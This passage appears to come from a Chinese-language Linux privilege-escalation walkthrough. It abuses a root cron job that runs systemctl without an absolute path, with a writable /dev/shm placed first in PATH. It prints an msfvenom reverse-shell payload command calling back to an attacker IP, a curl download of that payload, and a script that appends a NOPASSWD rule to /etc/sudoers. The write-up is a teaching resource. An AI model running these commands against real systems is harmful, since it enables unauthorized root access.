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" width="495" height="50" class="img_ev3q"></p>
<p>这里我们看到全是“w”，这意味着我们可以在这个目录中写入。</p>
<blockquote>
<p>/dev/shm 与 /tmp 类似，它是一个通用的全局可写目录。</p>
</blockquote>
<p>综上可知：我们有一个以 root 身份每分钟运行一次的 cron 作业，且是没有绝对 PATH 的 <strong>systemctl</strong> 执行命令，以及在 cron PATH 中比二进制文件执行位置更早的可写目录。</p>
<p>为了利用这个 cron 作业，我们要做的就是制作一个名为“systemctl”的恶意负载并将其放入 /dev/shm 文件夹中。</p>
<p>之后，当 cron 任务运行时，它将沿着 cron PATH 搜索 <strong>systemctl</strong> 二进制文件。由于 /dev/shm 位于 PATH 的最前面，所以它将停在那里运行我们的恶意负载，而不是从/usr/bin执行合法的 systemctl 二进制文件。</p>
<p>所以现在，我们的下一个目标是制作一个名为 “systemctl” 的恶意二进制文件。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="42设置漏洞并获取-root-shell"><strong><div id="id4.2">4.2、设置漏洞并获取 Root Shell</div></strong><a href="#42设置漏洞并获取-root-shell" class="hash-link" aria-label="42设置漏洞并获取-root-shell的直接链接" title="42设置漏洞并获取-root-shell的直接链接">​</a></h4>
<p>转到我们的攻击者机器，我们可以制作一个恶意二进制文件并使用 <strong>msfvenom</strong> 将其命名为 systemctl 。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 -f elf -o systemctl</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113629211-723743517-bb67bab8ca934a9c91335f020707c52e.png" width="802" height="127" class="img_ev3q"></p>
<p>现在我们的有效载荷已经创建，我们可以将其下载到受害者的机器上。</p>
<p>之前我们在工作目录中设置了一个 HTTP 服务器，用于将 LinPEAS 下载到受害者主机上。我们现在也可以使用它来将我们的有效载荷下载到受害者主机上。</p>
<p>在受害者主机上，将目录更改为 /dev/shm 目录，然后下载有效负载。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /dev/shm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">curl 172.16.1.30/systemctl -o systemctl</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113547287-2010852899-49dd04b3e74cd9865b6121a2ff03c82b.png" width="653" height="142" class="img_ev3q"></p>
<p>这里我们可以看到漏洞已成功下载；但是，它还没有准备好。为了让 cron 任务执行我们的二进制文件，我们需要授予其执行权限。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">chmod 755 ./systemctl</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113545858-223752257-f514055f1de8b85bb865d5c47209c184.png" width="446" height="78" class="img_ev3q"></p>
<p>完美！有效载荷已准备就绪，每分钟都会触发一次。剩下要做的就是在攻击者的机器上启动 netcat 监听器，并在下次 cron 作业运行时抓取 root shell。</p>
<p>不到一分钟，root shell 就检查完毕！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113554290-321560383-b46911863ba5a3c9f309ce66cf176052.png" width="503" height="169" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="43用脚本替换-syctemctl-二进制文件"><strong><div id="id4.3">4.3、用脚本替换 syctemctl 二进制文件</div></strong><a href="#43用脚本替换-syctemctl-二进制文件" class="hash-link" aria-label="43用脚本替换-syctemctl-二进制文件的直接链接" title="43用脚本替换-syctemctl-二进制文件的直接链接">​</a></h4>
<p>在创建恶意systemctl二进制文件时，我们实际上可以使用一个非常酷的技巧。</p>
<p>由于 cron 任务的工作方式，cron SHELL 通过调用 /bin/sh -c “command” 来执行 crontab 中的二进制文件/脚本</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113547255-816490229-af38e3ad79c14da62d29b984e8dc4150.png" width="869" height="169" class="img_ev3q"></p>
<p>这意味着我们实际上可以通过编写“脚本”来制作恶意的systemctl “二进制文件”。</p>
<blockquote>
<p>“二进制” 和 “脚本” 都加了引号，因为这两者单从作业执行上来看，其实就是一个具有执行权限的命令而已，无所谓区分是脚本还是二进制程序。</p>
</blockquote>
<p>由于 cron 作业将使用 /bin/sh -c 运行命令，所以我们要做的就是将单个恶意命令命名为systemctl的文件中，然后 cron 作业将像执行二进制文件一样执行它。</p>
<p>例如，我们可以用以下命令授予当前用户 完整的sudo 权限：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;echo &quot;devops ALL=(ALL) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#x27; &gt; /dev/shm/systemctl</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113547376-718696389-ded802af3b1b9e6acb12d341754c16bb.png" width="858" height="63" class="img_ev3q"></p>
<p>接下来，我们需要赋予脚本执行权限。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">chmod 755 /dev/shm/systemctl</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113550752-1572804535-6fd3b7e23b5d56d83c824d87ef5491e1.png" width="436" height="74" class="img_ev3q"></p>
<p>现在我们只需要等待一会儿，然后测试 <strong>sudo -l</strong> 命令看看它是否有效。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113610357-2088341772-173a8c0596aff27c0eff7cbcd9388383.png" width="955" height="109" class="img_ev3q"></p>
<p>BOOM！脚本执行并授予当前用户 完整的sudo 权限。</p>
<p>现在我们只需运行以下命令即可成为 root 用户且无需输入密码：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo su -</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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